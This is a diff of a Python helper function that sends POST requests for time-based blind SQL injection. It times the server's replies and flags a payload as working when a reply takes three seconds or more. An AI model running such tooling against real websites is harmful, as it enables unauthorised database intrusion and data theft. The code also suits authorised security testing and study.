@@ -57,42 +57,30 @@ def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_p
 
 """********************Same function here but we sending a post request and not a get requests*****************************************"""
 
-def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies1: None, cookies2: None) -> bool:
-    
-    #The payload is in the bad_sql_query function
-        
-    #here put the data value, if is empty just do that : data=...    
-    """Where the magic happens, we start the clock to know how much time the server answer to us"""
+def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, data1: None, data2: None) -> bool:
     
     start_time = time.time()
-    r = requests.post(url)
+    r = requests.post(url, data=data1)
     end_time = time.time()
-    
-    """Here we will know if the SQL_query will work, with a simple boolean operation"""
-
-    result_bool = (end_time - start_time) >= 4
-    
-    
-    if result_bool:
+    result_bool = (end_time - start_time) 
+    if result_bool >= 3:
+        result_bool = True
         print(f"This parameter work: {payload_parameter1}")
     else:
+        result_bool = False
         print("")    
-    
             
     start_time = time.time()
-    r = requests.post(url)
+    r = requests.post(url, data=data2)
     end_time = time.time()
-    
-    
-    result_control = (end_time - start_time) >= 4
-    
-    
-    if result_control:
+    result_control = (end_time - start_time)
+    if result_control >=3:
+        result_control = True
         print(f"Value found with this parameter: {payload_parameter2}")
     else:
-        print("")  
+        result_control= False
+        print("")    
         
-          
     return result_bool, result_control
 
 
